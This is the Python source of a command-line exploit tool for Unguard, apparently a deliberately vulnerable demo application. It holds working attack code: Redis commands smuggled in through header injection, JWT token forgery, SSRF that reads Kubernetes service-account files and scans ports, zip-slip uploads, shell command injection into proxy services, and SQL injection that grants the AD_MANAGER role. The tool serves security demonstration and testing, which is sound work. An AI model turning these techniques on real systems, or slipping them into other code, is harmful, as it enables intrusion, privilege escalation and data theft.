#
# Copyright 2023 Dynatrace LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

import base64
import os
import pickle
import subprocess

import click
import jwt
import requests
from decouple import config
from requests_html import HTMLSession

COOKIES_FILE = 'cookies.dump'

frontend_base_path = config('FRONTEND_BASE_PATH')
ad_manager_path = config('AD_SERVICE_BASE_PATH')


@click.group()
def cli():
    pass


@cli.command()
@click.option('--redis-host',
              default='localhost:6379',
              help='Redis hostname/ip')
@click.option('--target',
              prompt='Unguard target',
              default='unguard.kube',
              help='The host and port where Unguard frontend runs (depending on your exploit choice)')
@click.argument('payload_file')
def redis(redis_host, target, payload_file):
    """Tries to send a query to the running redis instance through header injection."""
    click.echo('Exploiting redis (running on %s) through Unguard (running on %s) ' % (redis_host, target))
    session = requests.session()
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return

    raw_payload = open(payload_file, "r").read()

    click.echo('Sending following redis commands (from %s):\n%s' % (payload_file, raw_payload))

    payload = prepare_injected_payload(raw_payload)
    frontend_payload = {'header': payload.encode("utf-8"), 'urlmessage': "http://" + redis_host}

    click.echo('Sending payload:')
    click.echo('---------START-OF-PAYLOAD---------\n%s' % payload)
    click.echo('----------END-OF-PAYLOAD----------')

    r = session.post(f'http://{target + frontend_base_path}/post', data=frontend_payload, allow_redirects=False)

    click.echo('Request returned status code %s.' % str(r.status_code))
    if r.status_code == 302:
        click.secho('Exploit successfully executed.', fg="green")
    else:
        click.echo(r.text)
        click.secho('Exploit failed. Response above.', fg="red", err=True)


@cli.command()
@click.argument('usertag')
def forge_token(usertag):
    """Forges a certain user's jwt-token and prints it to the command-line. Provide the usertag which is 'username:userid'"""
    session = requests.session()
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return

    jwt_token = session.cookies.get('jwt')
    script_path = os.path.join(os.path.dirname(__file__), 'exploits/jwt-forgery/payload/jwt_exploit_script.js')
    new_payload = '{"username": "' + usertag.split(':')[0] + '", "userid": ' + usertag.split(':')[1] + '}'
    forged_jwt_token = subprocess.check_output(
        ["node", script_path, jwt_token, base64.b64encode(new_payload.encode('ascii'))])

    click.echo("Forge user JWT-token: " + forged_jwt_token.decode("ascii"))
    session.cookies['jwt'] = forged_jwt_token.decode("ascii")


@cli.command()
@click.option('--url',
              prompt='SSRF URL:',
              default='http://example.com',
              help='URL to fetch using SSRF')
@click.option('--target',
              default='unguard.kube',
              help='The host and port where Unguard frontend runs')
def ssrf(url, target):
    """Accesses the contents of a URL through SSRF through the broken image posting feature of Unguard
    Works with any URL that the curl program accepts.

    As an example, pass the following urls as the url option:

    > http://example.com - Proof of concept

    > file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt - getting the API server certificate of the k8s api server

    > gopher://unguard-redis:6379/_CONFIG%20GET%20maxmemory - Accessing redis to let it execute CONFIG GET maxmemory

    """

    click.echo('Accessing URL (%s) through Unguard (running on %s) ' % (url, target))
    session = HTMLSession()
    if not logged_in(session):
        click.secho('Not logged in. Run login command first.', fg="red", err=True)
        return

    content = get_url_contents_ssrf(session, url, target)
    if content:
        click.secho('Exploit successful. Returned the following:', fg="blue")
        click.echo(content)
    else:
        click.secho('Exploit failed.', fg="red", err=True)


def validate_range(ctx, param, value):
    """
    Validates a port range cli option
    """
    try:
        min, max = map(int, value.split('-', 2))
        if min > max:
            raise click.BadParameter('min port needs to be smaller than max port')
        return (min, max)
    except ValueError:
        raise click.BadParameter('port range needs to be in format [min]-[max]')


@cli.command()
@click.option('--host',
              prompt='Host that will be port-scanned:',
              default='localhost',
              help='Host that will be port-scanned')
@click.option('--target',
              prompt='Unguard target',
              default='unguard.kube',
              help='The host and port where Unguard frontend runs')
@click.option('--ports',
              required=True,
              callback=validate_range,
              help='The range of ports to scan, including both min and max. (e.g. 8080-8085)')
def portscan(host, target, ports):
    """
    Tries accessing the selected host on all the ports specified
    """

    click.echo('Accessing %s on port range %s' % (host, ports))
    session = HTMLSession()
    if not logged_in(session):
        click.secho('Not logged in. Run login command first.', fg="red", err=True)
        return

    for i in range(ports[0], ports[1] + 1):
        content = get_url_contents_ssrf(session, host + ":" + str(i), target)
        if content:
            click.secho("[*] {0} on port {1} is open".format(host, str(i)), fg="green")
        else:
            click.secho("[*] {0} on port {1} seems closed".format(host, str(i)), fg="red")


@cli.command()
@click.argument('username')
@click.option('--target',
              prompt='Unguard frontend',
              default='unguard.kube',
              help='The host and port where Unguard frontend runs')
def login(username, target):
    """
    Logs the user in with the specified username, assuming the password is also the username.
    If it doesn't exist it will register it and then login.
    """
    click.echo('Logging in with %s ' % username)
    session = requests.session()

    user_data = {'username': username, 'password': username}

    try:
        r = session.post(f'http://{target + frontend_base_path}/register', data=user_data)
    except requests.exceptions.ConnectionError:
        click.secho(f'Couldn\'t connect to http://{target + frontend_base_path}/register.', fg="red", err=True)
        return

    click.echo('Register returned status code %s.' % str(r.status_code))
    response = session.post(f'http://{target + frontend_base_path}/login',
                            data=user_data,
                            allow_redirects=False)

    click.echo('Login returned response code:\n %s.' % response.status_code)
    click.echo('Saving session cookies: %s' % session.cookies.get_dict())
    with open(COOKIES_FILE, 'wb') as f:
        pickle.dump(session.cookies, f)


@cli.command()
@click.option('--target',
              prompt='Unguard frontend',
              default='unguard.kube',
              help='The host and port where Unguard frontend runs')
@click.option('--archive-path',
              prompt='Choose zip-archive which should be uploaded:',
              default='./zipslip_payloads/original-ads.zip',
              help='A archive with new images')
def ads_upload(target, archive_path):
    """
    Uploads an archive which will be extracted and displayed at the user ads.
    """
    session = HTMLSession()
    ad_manager_role = 'AD_MANAGER'

    if not logged_in_with_role(session, ad_manager_role):
        click.secho('Please login with user which has the role AD_MANAGER!', fg="red", err=True)
        return

    try:
        with open(archive_path, 'rb') as f:
            response = session.post(f'http://{target + frontend_base_path}/ad-manager/upload', files={"uploadZip": f})
    except FileNotFoundError:
        click.secho(f'Couldn\'t find file: {archive_path}', fg="red", err=True)
        return

    print(response)


@cli.command()
@click.argument('malicious_command')
@click.option('--target',
              prompt='Unguard frontend',
              default='unguard.kube',
              help='The host and port where Unguard frontend runs')
def cmd_inject_proxy(malicious_command, target):
    """
    Executes malicious command on proxy-service.
    """

    session = requests.session()
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return

    frontend_payload = {'imgurl': "example.com && " + malicious_command + " #"}

    r = session.post(f'http://{target + frontend_base_path}/post', data=frontend_payload, allow_redirects=False)

    click.echo('Request returned status code %s.' % str(r.status_code))
    click.secho('Exploit executed.', fg="green")


@cli.command()
@click.argument('malicious_command')
@click.option('--target',
              prompt='Unguard base address',
              default='unguard.kube',
              help='The host and port where Unguard runs')
def cmd_inject_envoy(malicious_command, target):
    """
    Executes malicious command on envoy-proxy.
    """

    path_params = {'path': "example.com; " + malicious_command}

    r = requests.get(f'http://{target}/healthz', params=path_params, allow_redirects=False)

    click.echo('Request returned status code %s.' % str(r.status_code))
    click.secho('Exploit executed.', fg="green")


@cli.command()
@click.option('--target',
              prompt='Unguard frontend',
              default='unguard.kube',
              help='The host and port where Unguard frontend runs')
@click.option('--sql-command',
              prompt='SQL Command',
              help='SQL command to be executed. E.g.: "UPDATE bio SET bio_text = \'injected\' WHERE 1 = 1;"')
def sql_inject_h2(sql_command, target):
    """
    Sends an SQL command to be executed on the h2 database through an SQLi vulnerability in the profile-service (Java), which is exposed through the bio.
    """
    session = requests.session()
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return

    decoded_jwt = jwt.decode(session.cookies.get('jwt'), options={"verify_signature": False})
    username = decoded_jwt['username']

    # post a bio to make sure a bio for this user exists already and an UPDATE statement is used on the server side
    session.post(f'http://{target + frontend_base_path}/bio/{username}', data={'bioText': ''}, allow_redirects=False)

    sql_command = str.strip(sql_command)  # remove unnecessary leading and trailing whitespace

    # if not already at the end of command, add semicolon to eliminate potential cause of syntax error
    if not sql_command.endswith(";"):
        sql_command += ";"

    # WHERE 1 = 0 makes sure no entries are actually updated before the SQL injection
    sql_command = "' WHERE 1 = 0; " + sql_command + " --"

    r = session.post(f'http://{target + frontend_base_path}/bio/{username}', data={'bioText': sql_command},
                     allow_redirects=False)

    # should always be status code 500 because no rows are updated with the first statement (WHERE 1 = 0)
    click.echo('Request returned status code %s.' % str(r.status_code))
    click.secho('Exploit executed.', fg="green")

@cli.command()
@click.option('--target',
              prompt='Unguard frontend',
              default='unguard.kube',
              help='The host and port where Unguard frontend runs')
@click.option('--sql-command',
              prompt='SQL Command',
              help='SQL command to be executed. E.g.: "INSERT INTO users_roles (user_id, role_id) SELECT id AS user_id, (SELECT id FROM roles where name=\'AD_MANAGER\') AS role_id FROM users WHERE id > 1;"')
def sql_inject_mariadb(sql_command, target):
    """
    Sends an SQL command to be executed on MariaDB through an SQLi vulnerability in the status-service (Golang), which is exposed through the user search bar.
    """
    session = requests.session()
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return

    sql_command = str.strip(sql_command)  # remove unnecessary leading and trailing whitespace

    # if not already at the end of command, add semicolon to eliminate potential cause of syntax error
    if not sql_command.endswith(";"):
        sql_command += ";"

    # Pre- and postfix command
    sql_command = "'; " + sql_command + " --"

    r = session.get(f'http://{target + frontend_base_path}/users/', params={'name': sql_command},
                     allow_redirects=False)

    # status code should be 200 on success, 500 otherwise
    click.echo('Request returned status code %s.' % str(r.status_code))
    if r.status_code == 200:
        click.secho('Exploit executed.', fg="green")
    else:
        click.secho('Exploit failed.', fg="red")


@cli.command()
@click.option('--target',
              prompt='Unguard frontend',
              default='unguard.kube',
              help='The host and port where Unguard frontend runs')
@click.option('--post',
              prompt='Post ID',
              default='1',
              help='The post ID of the post to unlike')
@click.option('--user',
              prompt='User ID',
              default='1',
              help='The user ID of the user whose like should be removed (admanager always has ID 1)')
def sql_inject_unlike_post(post, user, target):
    """
    Tries to remove a like for another user
    """
    session = requests.session()
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return

    r = session.get(f'http://{target + frontend_base_path}/unlike', params={'postId': [post, user]}, allow_redirects=False)

    # should always be status code 404
    click.echo('Request returned status code %s.' % str(r.status_code))
    click.secho('Exploit executed.', fg="green")


def prepare_injected_payload(payload: str):
    """
    Prepares redis payloads to be send via HTTP header injection in Apache HTTPClient
    """
    newline = "\u560d\u560a"  # see https://issues.apache.org/jira/browse/HTTPCLIENT-1974
    header_value = '1' + newline  # 1 is the value of the header we control and then we inject a newline
    payload = payload.replace('\n', newline)  # prepare redis payload

    return header_value + payload


def get_url_contents_ssrf(session: HTMLSession, url: str, target: str, silent=True):
    frontend_payload = {'imgurl': url, 'description': "ug-exploit accessing " + url}

    r = session.post(f'http://{target + frontend_base_path}/post', data=frontend_payload, allow_redirects=True)

    if r.status_code != 200:
        if not silent:
            click.echo('Request returned status code %s.' % str(r.status_code))
            click.echo(r.text)
            click.secho('Exploit failed. Response above.', fg="red", err=True)
        return None

    img_src = r.html.find('.card-body .col-auto img', first=True).attrs["src"]
    imgdata = img_src.split("data:image/jpg;base64,")[1]

    decoded = base64.b64decode(imgdata)
    return decoded


def logged_in(session):
    try:
        with open('cookies.dump', 'rb') as f:
            session.cookies.update(pickle.load(f))
            if session.cookies.get('jwt'):
                decoded_jwt = jwt.decode(session.cookies.get('jwt'), options={"verify_signature": False})
                click.echo("Logged in as: %s" % decoded_jwt)
                return True
            return False
    except:
        return False


def logged_in_with_role(session, role):
    try:
        with open('cookies.dump', 'rb') as f:
            session.cookies.update(pickle.load(f))
            if session.cookies.get('jwt'):
                decoded_jwt = jwt.decode(session.cookies.get('jwt'), options={"verify_signature": False})
                roles = decoded_jwt['roles']

                if len(roles) == 0 or role not in roles:
                    return False
            else:
                return False
    except:
        return False
    return True
